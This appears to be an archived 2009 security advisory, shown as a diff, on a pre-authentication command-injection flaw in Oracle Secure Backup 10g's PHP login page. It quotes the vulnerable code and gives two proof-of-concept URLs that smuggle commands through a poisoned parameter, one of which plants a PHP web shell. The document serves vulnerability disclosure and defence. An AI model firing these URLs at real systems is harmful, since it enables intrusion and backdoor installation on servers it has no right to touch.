@@ -1,0 +1,137 @@
+Oracle Secure Backup 10g Remote Code Execution
+==============================================
+
+Product Description
+===================
+
+Oracle Secure Backup is a centralized tape backup management software providing
+secure data protection for heterogeneous file systems and the Oracle Database.
+
+Summary
+=======
+
+The Oracle January 2009 Critical Patch Update fixes a vulnerability which
+allows a remote preauthenticated attacker to execute arbitrary code in the
+context of the user running the web server of Oracle Secure Backup.
+
+In Windows environments, the vulnerability allows execution of arbitrary code as
+SYSTEM. In Unix and GNU/Linux environments, however, just as a normal user
+(oracle usually).
+
+CVSS2 Risk Score
+================
+
+Microsoft Windows: 10
+Linux and Unix   :  7,5
+
+Affected versions
+=================
+
+Oracle Secure Backup version 10.1.0.3 to 10.2.0.2 in all supported operating systems
+are affected.
+
+Vulnerability Details
+=====================
+
+Oracle Secure Backup comes with one PHP based frontend which is vulnerable to a
+variable poisoning attack regardless if the PHP directive register_globals is 
+enabled or not.
+
+Internally, all the variables passed to the script login.php are converted to global
+variables in the file $ROOT\php\globals.php. Any variable regarding or regardless the
+method used to send the query will be registered as a global variable.
+
+From the login script called "login.php" the tool "obt.exe" is executed with a popen
+call passing arguments received from the client. These arguments are not sanitized
+nor verified and it allows post-authentication remote command execution BUT due to a
+logic failure in the script "login.php" when the variable "clear" has the value "no"
+and other variables (that supposedly comes from a cookie) are set anyone can execute
+operating system command from remote without being authenticated. The vulnerable code
+is the following:
+
+(...)
+    if (strlen($ora_osb_bgcookie) > 0 && $button == "Logout")
+      {
+      // Turn DEBUG_EXEC to off
+      $tmp = $DEBUG_EXEC;
+      $DEBUG_EXEC = "no";
+
+      // Teminate the connection.
+      $qr_command = "$rbtool --terminate $ora_osb_bgcookie-$ora_osb_lcookie";
+      $msg = exec_qr("$qr_command");
+
+      if (strncmp($msg[0], "Error:", 6))
+        {
+        // Set the cookie up.
+        setcookie("ora_osb_bgcookie", "");
+        setcookie("ora_osb_lcookie", "");
+        $ora_osb_bgcookie = "";
+        }
+
+      // Reset DEBUG_EXEC.
+      $DEBUG_EXEC = $dtmp;
+      }
+    header("Location: /login.php?clear=yes");
+    }
+(...)
+
+The function "exec_qr" internally calls the function PHP function "popen" to execute
+a command. The $rbtool variable, abusing from the variable poisoning attack, can be
+changed to, in example, /bin/sh or cmd.exe to execute arbitrary commands without the
+need for a user name or password, just with network access to the Oracle Secure Backup
+Web server. In fact, the script thinks that we're doing a logout.
+
+Proof of Concept
+================
+
+* Create a file in the directory "c:\"
+
+https://<target>/login.php?clear=no&ora_osb_lcookie=aa&ora_osb_bgcookie=bb&button=Logout&rbtool=cmd.exe+/c+echo+hello+world+%3E+c:\oracle.secure.backup.txt+;
+
+* Create a PHP backdoor
+
+https://<target>/login.php?clear=no&ora_osb_lcookie=aa&ora_osb_bgcookie=bb&button=Logout&rbtool=cmd.exe+/c+echo+%22%3C%3Fphp+print(shell_exec(%24_GET%5B'a'%5D))%3B+%3F%3E%22+%3E+test.php%3B%26%26+echo
+
+Workaround
+==========
+
+Disable the web server.
+
+Patch information
+=================
+
+Oracle fixed the vulnerability in version 10.2.0.3 of Oracle Secure Backup.
+
+Contact Information
+===================
+
+The vulnerability was found by Joxean Koret, admin[at]joxeankoret[dot]com
+
+References
+==========
+
+Oracle Secure Backup exec_qr() Command Injection Vulnerability:
+http://www.zerodayinitiative.com/advisories/ZDI-09-003/
+
+Oracle Critical Patch Update January 2009:
+http://www.oracle.com/technology/deploy/security/critical-patch-updates/cpujan2009.html
+
+Permanent Version of the advisory:
+http://joxeankoret.com/blog/?p=39
+
+Professional Web:
+http://www.joxeankoret.com
+
+Personal Blog:
+http://www.joxeankoret.com/blog
+
+Disclaimer
+==========
+
+The information in this advisory and any of its demonstrations is provided "as is"
+without any warranty of any kind.
+
+I am not liable for any direct or indirect damages caused as a result of using the
+information or demonstrations provided in any part of this advisory.
+
+# milw0rm.com [2009-01-14]
